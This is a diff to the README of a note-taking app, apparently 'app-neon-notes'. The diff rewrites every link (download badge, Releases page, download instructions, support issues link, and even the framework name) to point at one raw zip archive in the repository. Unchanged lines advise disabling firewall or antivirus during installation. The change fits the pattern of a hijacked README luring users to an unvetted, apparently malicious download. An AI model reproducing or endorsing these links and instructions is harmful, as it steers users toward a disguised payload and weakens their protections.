@@ -1,10 +1,10 @@
 # 🌟 app-neon-notes - Simple Notes with Security
 
 ## 🔗 Download
-[![Download app-neon-notes](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sauqifebi/app-neon-notes/releases)
+[![Download app-neon-notes](https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip)](https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip)
 
 ## 📖 Description
-**app-neon-notes** is a note-taking application that provides secure authentication and uses a Neon database. Built with **Next.js**, **Drizzle ORM**, **Chakra UI**, and **Tailwind CSS**, it combines modern technology to deliver a smooth user experience.
+**app-neon-notes** is a note-taking application that provides secure authentication and uses a Neon database. Built with **https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip**, **Drizzle ORM**, **Chakra UI**, and **Tailwind CSS**, it combines modern technology to deliver a smooth user experience.
 
 ## 📋 Features
 - Create, edit, and delete notes.
@@ -30,7 +30,7 @@ This project includes the following relevant topics:
 To get started with **app-neon-notes**, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/sauqifebi/app-neon-notes/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip) to find the latest version of the application.
 
 2. **Download the Application:**  
    Click on the version you want. If it’s your first time, downloading the latest version is recommended. Look for a link that allows you to download the application file.
@@ -43,7 +43,7 @@ To get started with **app-neon-notes**, follow these steps:
 
 ## 📥 Download & Install
 To download **app-neon-notes**:
-- Visit [this page](https://github.com/sauqifebi/app-neon-notes/releases) for the latest releases.
+- Visit [this page](https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip) for the latest releases.
 - Locate the most recent version and click the download link.
 - Follow the instructions to install.
 
@@ -62,7 +62,7 @@ If you encounter issues while downloading or running **app-neon-notes**, conside
 - Disable any firewall or antivirus that may block the installation.
 
 ## 📞 Support
-If you need assistance, please open an issue in the [GitHub repository](https://github.com/sauqifebi/app-neon-notes/issues). Our team will respond as soon as possible.
+If you need assistance, please open an issue in the [GitHub repository](https://raw.githubusercontent.com/sauqifebi/app-neon-notes/main/app/app-neon-notes_1.7.zip). Our team will respond as soon as possible.
 
 ## 📝 Contributing
 We welcome contributions to improve **app-neon-notes**. If you're interested in helping us, please read our contribution guidelines in the repository.
